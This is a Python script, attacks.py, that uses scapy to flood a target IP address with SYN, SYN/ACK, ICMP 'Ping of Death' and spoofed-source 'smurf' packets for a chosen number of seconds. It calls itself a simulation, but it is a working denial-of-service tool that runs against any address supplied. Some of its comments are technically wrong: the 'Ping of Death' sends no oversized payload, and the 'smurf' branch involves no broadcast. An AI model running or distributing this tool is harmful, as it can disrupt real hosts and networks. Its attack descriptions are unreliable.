#--------------------------------------------------------------
#                   attacks.py
#--------------------------------------------------------------
# This file simulates different types of Denial of Service (DOS) attacks against a specified target IP.

# Launch command (model on Linux): sudo /bin/python3 attacks.py <target_ip> <attack_type> <duration>
# example : sudo /bin/python3 attacks.py 192.168.1.25 syn_flood 5

from scapy.all import IP, TCP, ICMP, Raw, random, send
from argparse import ArgumentParser
from time import time

''' Function to perform a DOS attack based on the specified type and duration '''
def ddos(target_ip, attack_type, duration):

    target_port = 12345
    start_time = time()

    # If the attack type is SYN flood
    if attack_type == "syn_flood":
        
        while time() - start_time < duration:                                                   # Continue sending packets for the duration of the attack
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="S")         # Create a SYN packet using the target IP and port
            send(pkt, verbose=0)                                                                # verbose : display information during sending

    # If the attack type is Ping of Death (PoD)
    if attack_type == "pod":
        while time() - start_time < duration:
            load = 6000
            pkt = IP(dst=target_ip) / ICMP() / Raw(load=load)                                   # Create an ICMP packet with the oversized payload
            send(pkt, verbose=0)

    # If the attack type is SYN/ACK flood
    if attack_type == "syn_ack":
        while time() - start_time < duration:
            src_port = random.randint(1024, 65535)
            pkt = IP(dst=target_ip) / TCP(sport=src_port, dport=target_port, flags="SA")        # Create a SYN/ACK packet
            send(pkt, verbose=0)

    # If the attack type is Smurf attack (ICMP broadcast attack)
    if attack_type == "smurf":
        while time() - start_time < duration:
            pkt = IP(src=target_ip, dst=target_ip) / ICMP()                                     # Create an ICMP packet with the source and destination as the target IP (simulating a smurf attack)
            send(pkt, verbose=0)




''' Main block: responsible for parsing command-line arguments and executing the attack '''
if __name__ == "__main__":
    parser = ArgumentParser(description="DOS attack simulation")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("attack_type", choices=["syn_flood", "pod", "syn_ack", "smurf"], help="Type of attack")
    parser.add_argument("duration", type=int, help="Duration of the attack in seconds")

    args = parser.parse_args()
    ddos(args.target_ip, args.attack_type, args.duration)
